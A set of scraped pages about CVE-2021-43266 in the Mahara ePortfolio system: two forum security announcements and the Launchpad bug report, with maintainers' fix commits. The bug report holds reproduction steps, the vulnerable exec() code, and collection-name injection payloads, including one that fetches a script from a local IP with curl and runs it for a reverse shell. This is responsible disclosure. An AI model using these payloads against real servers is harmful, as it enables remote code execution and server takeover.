=== Content from mahara.org_aa75ef1b_20250114_225618.html ===

[Skip to main content](#header-main)

* [Login](https://mahara.org/?login)

Show search

SearchGo

[![Mahara ePortfolio System](https://mahara.org/theme/mahara-org/images/site-logo.svg?v=4165)](https://mahara.org/)
[![Mahara ePortfolio System](https://mahara.org/theme/raw/images/site-logo-small.svg?v=4165)](https://mahara.org/)
Show main menu

* [Home](https://mahara.org/)
* [Subscription](https://mahara.org/subscription)
* [Demo](https://mahara.org/demo)
* About

  + [About Mahara](https://mahara.org/about)
  + [About open source](https://mahara.org/about/opensource)
  + [Features](https://mahara.org/features)
  + [What is an ePortfolio?](https://mahara.org/about/eportfolios)
  + [Who is using Mahara?](https://mahara.org/showcase)
  + [News and announcements](https://mahara.org/news)
  + [Newsletter](https://mahara.org/newsletter)
  + [Podcast 'Create. Share. Engage.'](https://podcast.mahara.org)
* Community

  + [Community](https://mahara.org/community)
  + [Forums](https://mahara.org/forums)
  + [Mahara manual](https://mahara.org/documentation)
  + [Wiki](https://mahara.org/wiki)
  + [Bug / feature tracker](https://mahara.org/tracker)
  + [Release notes](https://mahara.org/releasenotes)
  + [Security](https://mahara.org/security)
  + [Contributors](https://mahara.org/community/contributors)
  + [Branding](https://mahara.org/branding)
  + [Events](https://mahara.org/events)
* Partners

  + [Partners](https://mahara.org/partners)
  + [Business Partners](https://mahara.org/business-partners)
  + [Supporters](https://mahara.org/supporters)

# Portfolios for your learning community

SearchGo

[Try out Mahara](http://demo.mahara.org/)

![Continuous single line drawing of a puhutukawa tree with a tui on the branches](https://mahara.org/theme/mahara-org/images/dashboard-tree-desktop-full.svg)

![Continuous single line drawing of a person working on a laptop](https://mahara.org/theme/mahara-org/images/dashboard-person-desktop.svg)

## Create portfolios

Using Mahara, students and staff create their personal learning stories by uploading evidence of activities they have participated in, and embedding publicly accessible content they have previously put online. They can write reflections on their experiences that frame this evidence, map it to competencies or registration requirements, and provide necessary context.

Mahara can be used for many different portfolio purposes, such as study, professional development, work-integrated learning, assessment, showcase and presentation, and employability.

[Learn about the portfolio options](https://mahara.org/view/view.php?id=137010)

## Share work

Mahara allows portfolios to be shared flexibly with one person, a specific group of people, or the entire world. Access can be further restricted to a particular time frame or just within an assessment task.

[Find out about sharing portfolios](https://mahara.org/view/view.php?id=137011)

![Continuous single line drawing of a paper plane in flight](https://mahara.org/theme/mahara-org/images/dashboard-paperplane-desktop.svg)

![Continuous single line drawing of a group of people sitting around a laptop in discussion](https://mahara.org/theme/mahara-org/images/dashboard-group-desktop.svg)

## Engage with others

Mahara makes it easy to comment and give feedback. Portfolios can also be submitted to learning management systems via LTI (Learning Tools Interoperability) for marking.

Groups in Mahara allow people to create portfolios collaboratively and engage in forum discussions.

[Learn about collaborating in Mahara](https://mahara.org/view/view.php?id=137012)

## Listen to portfolio stories

In our podcast 'Create. Share. Engage.' portfolio practitioners, researchers, learning designers, and portfolio authors share their journey. Learn how they navigate the many different facets of portfolios in general, and Mahara specifically.

[Listen on the podcast website or in your favourite app](https://podcast.mahara.org/)

![Continuous single line drawing of a speech bubble with the words 'Create. Share. Engage. Portfolios for learning and more'](https://mahara.org/theme/mahara-org/images/dashboard-podcast-desktop.svg)

![Continuous single line drawing of a speech bubble with the words 'Create. Share. Engage. Portfolios for learning and more'](https://mahara.org/theme/mahara-org/images/dashboard-podcast-logo.svg)

Mahara Community

* [About
  (tab)](https://mahara.org/group/mahara-community)
* [Members
  (tab)](https://mahara.org/group/members.php?id=1)
* [Forums
  (tab selected)](https://mahara.org/interaction/forum/index.php?group=1)
* [Portfolios
  (tab)](https://mahara.org/view/groupviews.php?group=1)

# Forums | Mahara Community

## [Security Announcements](https://mahara.org/interaction/forum/view.php?id=43) / Command injection when PDF bulk is enabled in Mahara before in Mahara before 21.10.1, 21.04.3, and 20.10.4

---

This topic is closed. Only moderators and the group administrators can post new replies.

![Doris ⚡'s profile picture](https://mahara.org/thumb.php?type=profileiconbyid&maxwidth=40&maxheight=40&id=441481)
[Doris ⚡](https://mahara.org/user/doris-tam)

Posts: 102

09 February 2022, 17:24

This is a follow-up for an already [released security fix](https://bugs.launchpad.net/mahara/%2Bbug/1942903).

Vulnerability type: Code execution
Attack type: Local
Impact: Ability to gain privileges

Affected components: Exporting of collections with PDF export enabled
Attack vectors: If a person names a collection in a certain way then on exporting it can cause the name to be executed as a command.

Description: In Mahara before 20.10.4, 21.04.3, and 21.10.1, exporting collections via PDF export could cause code execution.

Reported by: Dominic Couture
Bug report: [https://bugs.launchpad.net/mahara/+bug/1949527](https://bugs.launchpad.net/mahara/%2Bbug/1949527)
CVE reference: [2021-43266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43266)

### Edits to this post:

* [![Kristina Hoeppner's profile picture](https://mahara.org/thumb.php?type=profileiconbyid&maxwidth=20&maxheight=20&id=438257)
  Kristina Hoeppner](https://mahara.org/user/anitsirk) -
  10 February 2022, 11:27
* [![Kristina Hoeppner's profile picture](https://mahara.org/thumb.php?type=profileiconbyid&maxwidth=20&maxheight=20&id=438257)
  Kristina Hoeppner](https://mahara.org/user/anitsirk) -
  10 February 2022, 11:29

1 result

## Subscribe to our monthly newsletter

Do you want to stay updated on the latest news from Mahara and wider portfolio community? Subscribe to the monthly Mahara newsletter from Catalyst, the maintainers of Mahara.

[Sign up for the newsletter](https://zcu.nz/wpPM)

Create. Share. Engage.
[Try out Mahara](http://demo.mahara.org/)
[Support Mahara](https://mahara.org/subscription)

#### [Support](https://mahara.org/community)

* [Community forums](https://mahara.org/forums)
* [Mahara manual](https://mahara.org/documentation)
* [Wiki](https://mahara.org/wiki)
* [Bug / feature tracker](https://mahara.org/tracker)
* [Extended security support](https://mahara.org/extended-security-support)

#### [Get involved](https://mahara.org/community)

* [Community forums](https://mahara.org/forums)
* [Code repository](https://mahara.org/repository)
* [Contribute](https://mahara.org/contribute)
* [Release notes](https://mahara.org/releasenotes)
* [Events](https://mahara.org/events)

#### [About](https://mahara.org/about)

* [News and announcements](https://mahara.org/news)
* [Podcast 'Create. Share. Engage.'](https://podcast.mahara.org)
* [Contributors](https://mahara.org/community/contributors)
* [Security](https://mahara.org/security)
* [Accessibility](https://mahara.org/accessibility)

#### [Home](https://mahara.org/)

#### [Partners](https://mahara.org/partners)

#### [Subscription](https://mahara.org/subscription)

#### [Demo site](https://mahara.org/demo)

[![Powered by Mahara](https://mahara.org/theme/mahara-org/images/powered_by_mahara.svg?v=4165)](https://mahara.org/)

* [Legal](https://mahara.org/legal.php)
* [Contact us](https://mahara.org/contact.php)
* [Help](https://manual.mahara.org/en/24.04/)

[![Developed and maintained by Catalyst](https://mahara.org/theme/mahara-org/images/maintained-by-catalyst.png)](https://catalyst.net.nz/)

[Follow us on LinkedIn](https://www.linkedin.com/company/1845966)

[Find us on Mastodon](https://mastodon.nzoss.nz/%40mahara)



=== Content from mahara.org_3dd3ec7f_20250114_225617.html ===

[Skip to main content](#header-main)

* [Login](https://mahara.org/?login)

Show search

SearchGo

[![Mahara ePortfolio System](https://mahara.org/theme/mahara-org/images/site-logo.svg?v=4165)](https://mahara.org/)
[![Mahara ePortfolio System](https://mahara.org/theme/raw/images/site-logo-small.svg?v=4165)](https://mahara.org/)
Show main menu

* [Home](https://mahara.org/)
* [Subscription](https://mahara.org/subscription)
* [Demo](https://mahara.org/demo)
* About

  + [About Mahara](https://mahara.org/about)
  + [About open source](https://mahara.org/about/opensource)
  + [Features](https://mahara.org/features)
  + [What is an ePortfolio?](https://mahara.org/about/eportfolios)
  + [Who is using Mahara?](https://mahara.org/showcase)
  + [News and announcements](https://mahara.org/news)
  + [Newsletter](https://mahara.org/newsletter)
  + [Podcast 'Create. Share. Engage.'](https://podcast.mahara.org)
* Community

  + [Community](https://mahara.org/community)
  + [Forums](https://mahara.org/forums)
  + [Mahara manual](https://mahara.org/documentation)
  + [Wiki](https://mahara.org/wiki)
  + [Bug / feature tracker](https://mahara.org/tracker)
  + [Release notes](https://mahara.org/releasenotes)
  + [Security](https://mahara.org/security)
  + [Contributors](https://mahara.org/community/contributors)
  + [Branding](https://mahara.org/branding)
  + [Events](https://mahara.org/events)
* Partners

  + [Partners](https://mahara.org/partners)
  + [Business Partners](https://mahara.org/business-partners)
  + [Supporters](https://mahara.org/supporters)

# Portfolios for your learning community

SearchGo

[Try out Mahara](http://demo.mahara.org/)

![Continuous single line drawing of a puhutukawa tree with a tui on the branches](https://mahara.org/theme/mahara-org/images/dashboard-tree-desktop-full.svg)

![Continuous single line drawing of a person working on a laptop](https://mahara.org/theme/mahara-org/images/dashboard-person-desktop.svg)

## Create portfolios

Using Mahara, students and staff create their personal learning stories by uploading evidence of activities they have participated in, and embedding publicly accessible content they have previously put online. They can write reflections on their experiences that frame this evidence, map it to competencies or registration requirements, and provide necessary context.

Mahara can be used for many different portfolio purposes, such as study, professional development, work-integrated learning, assessment, showcase and presentation, and employability.

[Learn about the portfolio options](https://mahara.org/view/view.php?id=137010)

## Share work

Mahara allows portfolios to be shared flexibly with one person, a specific group of people, or the entire world. Access can be further restricted to a particular time frame or just within an assessment task.

[Find out about sharing portfolios](https://mahara.org/view/view.php?id=137011)

![Continuous single line drawing of a paper plane in flight](https://mahara.org/theme/mahara-org/images/dashboard-paperplane-desktop.svg)

![Continuous single line drawing of a group of people sitting around a laptop in discussion](https://mahara.org/theme/mahara-org/images/dashboard-group-desktop.svg)

## Engage with others

Mahara makes it easy to comment and give feedback. Portfolios can also be submitted to learning management systems via LTI (Learning Tools Interoperability) for marking.

Groups in Mahara allow people to create portfolios collaboratively and engage in forum discussions.

[Learn about collaborating in Mahara](https://mahara.org/view/view.php?id=137012)

## Listen to portfolio stories

In our podcast 'Create. Share. Engage.' portfolio practitioners, researchers, learning designers, and portfolio authors share their journey. Learn how they navigate the many different facets of portfolios in general, and Mahara specifically.

[Listen on the podcast website or in your favourite app](https://podcast.mahara.org/)

![Continuous single line drawing of a speech bubble with the words 'Create. Share. Engage. Portfolios for learning and more'](https://mahara.org/theme/mahara-org/images/dashboard-podcast-desktop.svg)

![Continuous single line drawing of a speech bubble with the words 'Create. Share. Engage. Portfolios for learning and more'](https://mahara.org/theme/mahara-org/images/dashboard-podcast-logo.svg)

Mahara Community

* [About
  (tab)](https://mahara.org/group/mahara-community)
* [Members
  (tab)](https://mahara.org/group/members.php?id=1)
* [Forums
  (tab selected)](https://mahara.org/interaction/forum/index.php?group=1)
* [Portfolios
  (tab)](https://mahara.org/view/groupviews.php?group=1)

# Forums | Mahara Community

## [Security Announcements](https://mahara.org/interaction/forum/view.php?id=43) / PDF export cause code execution in Mahara before 20.04.5, 20.10.3, 21.04.2, and 21.10.0

---

This topic is closed. Only moderators and the group administrators can post new replies.

![Robert Lyon's profile picture](https://mahara.org/thumb.php?type=profileiconbyid&maxwidth=40&maxheight=40&id=313288)
[Robert Lyon](https://mahara.org/user/robertlyon-1)

Posts: 778

29 October 2021, 17:02

Vulnerability type: Code execution
Attack type: Local
Impact: Ability to gain privileges

Affected components: Exporting of collections with PDF export enabled
Attack vectors: If a person names a collection in a certain way then on exporting it can cause the name to be executed as a command.

Description: In Mahara before 20.04.5, 20.10.3, 21.04.2, and 21.10.0, exporting collections via PDF export could cause code execution.

Reported by: Dominic Couture
Bug report: [https://bugs.launchpad.net/mahara/+bug/1942903](https://bugs.launchpad.net/mahara/%2Bbug/1942903)
CVE reference: [2021-43266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43266)

### Edits to this post:

* [![Kristina Hoeppner's profile picture](https://mahara.org/thumb.php?type=profileiconbyid&maxwidth=20&maxheight=20&id=438257)
  Kristina Hoeppner](https://mahara.org/user/anitsirk) -
  04 November 2021, 15:40

1 result

## Subscribe to our monthly newsletter

Do you want to stay updated on the latest news from Mahara and wider portfolio community? Subscribe to the monthly Mahara newsletter from Catalyst, the maintainers of Mahara.

[Sign up for the newsletter](https://zcu.nz/wpPM)

Create. Share. Engage.
[Try out Mahara](http://demo.mahara.org/)
[Support Mahara](https://mahara.org/subscription)

#### [Support](https://mahara.org/community)

* [Community forums](https://mahara.org/forums)
* [Mahara manual](https://mahara.org/documentation)
* [Wiki](https://mahara.org/wiki)
* [Bug / feature tracker](https://mahara.org/tracker)
* [Extended security support](https://mahara.org/extended-security-support)

#### [Get involved](https://mahara.org/community)

* [Community forums](https://mahara.org/forums)
* [Code repository](https://mahara.org/repository)
* [Contribute](https://mahara.org/contribute)
* [Release notes](https://mahara.org/releasenotes)
* [Events](https://mahara.org/events)

#### [About](https://mahara.org/about)

* [News and announcements](https://mahara.org/news)
* [Podcast 'Create. Share. Engage.'](https://podcast.mahara.org)
* [Contributors](https://mahara.org/community/contributors)
* [Security](https://mahara.org/security)
* [Accessibility](https://mahara.org/accessibility)

#### [Home](https://mahara.org/)

#### [Partners](https://mahara.org/partners)

#### [Subscription](https://mahara.org/subscription)

#### [Demo site](https://mahara.org/demo)

[![Powered by Mahara](https://mahara.org/theme/mahara-org/images/powered_by_mahara.svg?v=4165)](https://mahara.org/)

* [Legal](https://mahara.org/legal.php)
* [Contact us](https://mahara.org/contact.php)
* [Help](https://manual.mahara.org/en/24.04/)

[![Developed and maintained by Catalyst](https://mahara.org/theme/mahara-org/images/maintained-by-catalyst.png)](https://catalyst.net.nz/)

[Follow us on LinkedIn](https://www.linkedin.com/company/1845966)

[Find us on Mastodon](https://mastodon.nzoss.nz/%40mahara)



=== Content from bugs.launchpad.net_220249be_20250114_225613.html ===

[Log in / Register](https://bugs.launchpad.net/mahara/%2Bbug/1942903/%2Blogin)

[![](https://launchpadlibrarian.net/302557383/mahara_64x64.png)](https://launchpad.net/mahara)

## [Mahara](https://launchpad.net/mahara)

* [Overview](https://launchpad.net/mahara)
* [Code](https://code.launchpad.net/mahara)
* [Bugs](https://bugs.launchpad.net/mahara)
* [Blueprints](https://blueprints.launchpad.net/mahara)
* [Translations](https://translations.launchpad.net/mahara)
* [Answers](https://answers.launchpad.net/mahara)

# Command injection vulnerability when PDF bulk export is enabled

Bug #1942903 reported by
[Dominic](https://launchpad.net/~dee-see)
on 2021-09-07

[258](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Mahara](https://bugs.launchpad.net/mahara) | Fix Released | High | Unassigned | [Mahara 21.10.0](https://launchpad.net/mahara/%2Bmilestone/21.10.0) |
|  | [20.04](https://bugs.launchpad.net/mahara/20.04) | Fix Released | High | Unassigned | [Mahara 20.04.5](https://launchpad.net/mahara/%2Bmilestone/20.04.5) |
|  | [20.10](https://bugs.launchpad.net/mahara/20.10) | Fix Released | High | Unassigned | [Mahara 20.10.3](https://launchpad.net/mahara/%2Bmilestone/20.10.3) |
|  | [21.04](https://bugs.launchpad.net/mahara/21.04) | Fix Released | High | Unassigned | [Mahara 21.04.2](https://launchpad.net/mahara/%2Bmilestone/21.04.2) |

### Bug Description

Hi team, I hope you're doing well! When the experimental PDF export feature is enabled, a user can craft a malicious collection in Mahara and trigger the command injection issue when an admin exports the attacker's data (either specifically or by exporting the institution the attacker belongs to).

This was tested yesterday (2021-09-06) using the docker-compose file in the master branch of <https://git.mahara.org/mahara/mahara/-/tree/master/docker>

## Steps To Reproduce:

URLs will be using `<http://localhost:6142/mahara/>` as that's my local instance's URL. Modify the base URL to fit your environment.

### Setup

1. Login as administrator

2. Go to the Plugin Administration page `<http://localhost:6142/mahara/admin/extensions/plugins.php>` and enable PDF at the bottom right of the page (installing some prerequisites on the server might be necessary, the plugins page should have instructions)

### Exploitation

1. As the attacker (normal user account), create a collection named `;sleep${IFS}100;`

2. As the administrator go to the bulk export page `<http://localhost:6142/mahara/admin/users/bulkexport.php>`

3. Choose `PDF files of pages and collections` as the export format

4. Set the attacker's username in `Usernames to export`

5. Click `Export Accounts` and observe the 100 seconds delay in processing

See the following section for a reverse shell example

## Details

The issue comes from <https://git.mahara.org/mahara/mahara/-/blob/master/htdocs/export/pdf/lib.php#L298>

```php

                $collectionname = $this->collections[$collectionid]->get('name');

                $collectionname = parent::text\_to\_filename($collectionname);

                if ($combiner == 'pdfunite') {

                    exec('pdfunite ' . implode(' ', $collection) . ' ' . $pdfdirectory . '/' . $collectionid . '\_' . $collectionname . '.pdf', $output);

                }

```

`$collectionname` is user controlled and the sanitization allows just enough characters to be able to inject commands

<https://git.mahara.org/mahara/mahara/-/blob/master/htdocs/export/html/lib.php#L372-L375>

```php

    public static function text\_to\_filename($text) {

        // truncates the text and replaces NOT allowed characters to hyphens

        return preg\_replace('#["()\*/:<>?\\| ]+#', '-', mb\_substr($text, 0, parent::MAX\_FILENAME\_LENGTH, 'utf-8'));

    }

```

In the attached video the malicious collection name is

```bash

;cd$IFS`mktemp$IFS-d`;curl${IFS}192.168.1.75$IFS-o${IFS}a.sh;bash${IFS}a.sh;

```

and it triggered a reverse shell, see attached video. Note that I had to install curl on my server to make it work, but that's likely to be present on a real system.

Suggested CVSS: AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H 8.0

`AC:H` because of the setting that's likely to be disabled, `PR:L` because the payload is injected as a regular user, `UI:R` as it's triggered by an admin export, `S:C` as it impact everything on the server once a reverse shell is obtained.

Let me know if you need anything else!

Dominic

See [original description](comments/0)

## CVE References

* [2021-43266](/bugs/cve/2021-43266 "In Mahara before 20.04.5, 20.10.3, 21...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dominic (dee-see)](https://launchpad.net/~dee-see) wrote on 2021-09-07: |  |  | [#1](/mahara/%2Bbug/1942903/comments/1) |
| --- | --- | --- | --- |

* [2021-09-06 08-22-12.mp4](https://bugs.launchpad.net/mahara/%2Bbug/1942903/%2Battachment/5523517/%2Bfiles/2021-09-06%2008-22-12.mp4)
  [Edit](/mahara/%2Bbug/1942903/%2Battachment/5523517)
  (4.0 MiB,
  video/mp4)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dominic (dee-see)](https://launchpad.net/~dee-see) wrote on 2021-09-07: |  |  | [#2](/mahara/%2Bbug/1942903/comments/2) |
| --- | --- | --- | --- |

I'm used to writing everything in Markdown, just for clarity in the step 1 of exploitation the backticks aren't part of the payload. The collection name is just ;sleep${IFS}100;

I'm used to writing everything in Markdown, just for clarity in the step 1 of exploitation the backticks aren't part of the payload. The collection name is just ;sleep${IFS}100;

[Dominic (dee-see)](https://launchpad.net/~dee-see)
on 2021-09-07

| **description**: | updated |
| --- | --- |

[Robert Lyon (robertl-9)](https://launchpad.net/~robertl-9)
on 2021-09-23

| Changed in mahara: | |
| --- | --- |
| **status**: | New → Confirmed |
| **importance**: | Undecided → High |
| **milestone**: | none → 21.10.0 |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Lyon (robertl-9)](https://launchpad.net/~robertl-9) wrote on 2021-09-23: |  |  | [#3](/mahara/%2Bbug/1942903/comments/3) |
| --- | --- | --- | --- |

Have begin a security fix for this

<https://reviews.mahara.org/#/c/12027/>

It will be publicly available once reviewed

Have begin a security fix for this
https://reviews.mahara.org/#/c/12027/
It will be publicly available once reviewed

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kristina Hoeppner (kris-hoeppner)](https://launchpad.net/~kris-hoeppner) wrote on 2021-09-23: |  |  | [#4](/mahara/%2Bbug/1942903/comments/4) |
| --- | --- | --- | --- |

Hi Dominic,

We will apply for a CVE number for this security issue and plan to release a fix for it with our next minor point updates that we expect by the end of October this year.

Thank you

Kristina

Hi Dominic,
We will apply for a CVE number for this security issue and plan to release a fix for it with our next minor point updates that we expect by the end of October this year.
Thank you
Kristina

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28:  [**A change has been merged**](/mahara/%2Bbug/1942903/comments/6) |  |  | [#6](/mahara/%2Bbug/1942903/comments/6) |
| --- | --- | --- | --- |

Reviewed: <https://reviews.mahara.org/12126>

Committed: <https://git.mahara.org/mahara/mahara/commit/ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd>

Submitter: Robert Lyon (<email address hidden>)

Branch: main

commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd

Author: Robert Lyon <email address hidden>

Date: Thu Sep 23 09:48:23 2021 +1200

Security [bug 1942903](/bugs/1942903): PDF export can cause command injection vulnerability

When a person names a collection in a certain way the title can be

executed when merging the PDF pages into one collection PDF

Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86

Signed-off-by: Robert Lyon <email address hidden>

Reviewed: https://reviews.mahara.org/12126
Committed: https://git.mahara.org/mahara/mahara/commit/ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd
Submitter: Robert Lyon (robertl@catalyst.net.nz)
Branch: main
commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd
Author: Robert Lyon <robertl@catalyst.net.nz>
Date: Thu Sep 23 09:48:23 2021 +1200
Security bug 1942903: PDF export can cause command injection vulnerability
When a person names a collection in a certain way the title can be
executed when merging the PDF pages into one collection PDF
Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86
Signed-off-by: Robert Lyon <robertl@catalyst.net.nz>

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28:  [**A patch has been submitted for review**](/mahara/%2Bbug/1942903/comments/7) |  |  | [#7](/mahara/%2Bbug/1942903/comments/7) |
| --- | --- | --- | --- |

Patch for "21.10\_DEV" branch: <https://reviews.mahara.org/12202>

Patch for "21.10\_DEV" branch: https://reviews.mahara.org/12202

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28:  [**A change has been merged**](/mahara/%2Bbug/1942903/comments/8) |  |  | [#8](/mahara/%2Bbug/1942903/comments/8) |
| --- | --- | --- | --- |

Reviewed: <https://reviews.mahara.org/12202>

Committed: <https://git.mahara.org/mahara/mahara/commit/79442bf3879049a5e49f4c1891bbd26570ac27a8>

Submitter: Robert Lyon (<email address hidden>)

Branch: 21.10\_DEV

commit 79442bf3879049a5e49f4c1891bbd26570ac27a8

Author: Robert Lyon <email address hidden>

Date: Thu Sep 23 09:48:23 2021 +1200

Security [bug 1942903](/bugs/1942903): PDF export can cause command injection vulnerability

When a person names a collection in a certain way the title can be

executed when merging the PDF pages into one collection PDF

Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86

Signed-off-by: Robert Lyon <email address hidden>

(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)

Reviewed: https://reviews.mahara.org/12202
Committed: https://git.mahara.org/mahara/mahara/commit/79442bf3879049a5e49f4c1891bbd26570ac27a8
Submitter: Robert Lyon (robertl@catalyst.net.nz)
Branch: 21.10\_DEV
commit 79442bf3879049a5e49f4c1891bbd26570ac27a8
Author: Robert Lyon <robertl@catalyst.net.nz>
Date: Thu Sep 23 09:48:23 2021 +1200
Security bug 1942903: PDF export can cause command injection vulnerability
When a person names a collection in a certain way the title can be
executed when merging the PDF pages into one collection PDF
Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86
Signed-off-by: Robert Lyon <robertl@catalyst.net.nz>
(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28:  [**A patch has been submitted for review**](/mahara/%2Bbug/1942903/comments/9) |  |  | [#9](/mahara/%2Bbug/1942903/comments/9) |
| --- | --- | --- | --- |

Patch for "21.04\_STABLE" branch: <https://reviews.mahara.org/12203>

Patch for "21.04\_STABLE" branch: https://reviews.mahara.org/12203

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28: |  |  | [#10](/mahara/%2Bbug/1942903/comments/10) |
| --- | --- | --- | --- |

Patch for "20.10\_STABLE" branch: <https://reviews.mahara.org/12204>

Patch for "20.10\_STABLE" branch: https://reviews.mahara.org/12204

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28: |  |  | [#11](/mahara/%2Bbug/1942903/comments/11) |
| --- | --- | --- | --- |

Patch for "20.04\_STABLE" branch: <https://reviews.mahara.org/12205>

Patch for "20.04\_STABLE" branch: https://reviews.mahara.org/12205

[Kristina Hoeppner (kris-hoeppner)](https://launchpad.net/~kris-hoeppner)
on 2021-10-28

| **no longer affects**: | mahara/21.10 |
| --- | --- |

[Robert Lyon (robertl-9)](https://launchpad.net/~robertl-9)
on 2021-10-28

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28:  [**A change has been merged**](/mahara/%2Bbug/1942903/comments/12) |  |  | [#12](/mahara/%2Bbug/1942903/comments/12) |
| --- | --- | --- | --- |

Reviewed: <https://reviews.mahara.org/12205>

Committed: <https://git.mahara.org/mahara/mahara/commit/b30d4a821812fdb8fd533592dedc8911c6ecf5b5>

Submitter: Robert Lyon (<email address hidden>)

Branch: 20.04\_STABLE

commit b30d4a821812fdb8fd533592dedc8911c6ecf5b5

Author: Robert Lyon <email address hidden>

Date: Thu Sep 23 09:48:23 2021 +1200

Security [bug 1942903](/bugs/1942903): PDF export can cause command injection vulnerability

When a person names a collection in a certain way the title can be

executed when merging the PDF pages into one collection PDF

Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86

Signed-off-by: Robert Lyon <email address hidden>

(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)

(cherry picked from commit 79442bf3879049a5e49f4c1891bbd26570ac27a8)

Reviewed: https://reviews.mahara.org/12205
Committed: https://git.mahara.org/mahara/mahara/commit/b30d4a821812fdb8fd533592dedc8911c6ecf5b5
Submitter: Robert Lyon (robertl@catalyst.net.nz)
Branch: 20.04\_STABLE
commit b30d4a821812fdb8fd533592dedc8911c6ecf5b5
Author: Robert Lyon <robertl@catalyst.net.nz>
Date: Thu Sep 23 09:48:23 2021 +1200
Security bug 1942903: PDF export can cause command injection vulnerability
When a person names a collection in a certain way the title can be
executed when merging the PDF pages into one collection PDF
Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86
Signed-off-by: Robert Lyon <robertl@catalyst.net.nz>
(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)
(cherry picked from commit 79442bf3879049a5e49f4c1891bbd26570ac27a8)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-28: |  |  | [#13](/mahara/%2Bbug/1942903/comments/13) |
| --- | --- | --- | --- |

Reviewed: <https://reviews.mahara.org/12203>

Committed: <https://git.mahara.org/mahara/mahara/commit/7d94b9e9f87b1235d51f59f8db2d57caf7edd09b>

Submitter: Gold (<email address hidden>)

Branch: 21.04\_STABLE

commit 7d94b9e9f87b1235d51f59f8db2d57caf7edd09b

Author: Robert Lyon <email address hidden>

Date: Thu Sep 23 09:48:23 2021 +1200

Security [bug 1942903](/bugs/1942903): PDF export can cause command injection vulnerability

When a person names a collection in a certain way the title can be

executed when merging the PDF pages into one collection PDF

Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86

Signed-off-by: Robert Lyon <email address hidden>

(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)

(cherry picked from commit 79442bf3879049a5e49f4c1891bbd26570ac27a8)

Reviewed: https://reviews.mahara.org/12203
Committed: https://git.mahara.org/mahara/mahara/commit/7d94b9e9f87b1235d51f59f8db2d57caf7edd09b
Submitter: Gold (gold@catalyst.net.nz)
Branch: 21.04\_STABLE
commit 7d94b9e9f87b1235d51f59f8db2d57caf7edd09b
Author: Robert Lyon <robertl@catalyst.net.nz>
Date: Thu Sep 23 09:48:23 2021 +1200
Security bug 1942903: PDF export can cause command injection vulnerability
When a person names a collection in a certain way the title can be
executed when merging the PDF pages into one collection PDF
Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86
Signed-off-by: Robert Lyon <robertl@catalyst.net.nz>
(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)
(cherry picked from commit 79442bf3879049a5e49f4c1891bbd26570ac27a8)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Lyon (robertl-9)](https://launchpad.net/~robertl-9) wrote on 2021-10-28: |  |  | [#5](/mahara/%2Bbug/1942903/comments/5) |
| --- | --- | --- | --- |

For the security forum post:

Vulnerability type: Code execution

Attack type: Local

Impact: Ability to gain privileges

Affected components: Exporting of collections with PDF export enabled

Attack vectors: If a person names a collection in a certain way then on exporting it can cause the name to be executed as a command.

Suggested description: In Mahara before 20.04.5, 20.10.3, 21.04.2, and 21.10.0, exporting collections via PDF export could cause code execution.

Reported by: Dominic Couture

Bug report: [https://bugs.launchpad.net/mahara/+bug/1942903](https://bugs.launchpad.net/mahara/%2Bbug/1942903)

CVE reference: TBC

For the security forum post:
Vulnerability type: Code execution
Attack type: Local
Impact: Ability to gain privileges
Affected components: Exporting of collections with PDF export enabled
Attack vectors: If a person names a collection in a certain way then on exporting it can cause the name to be executed as a command.
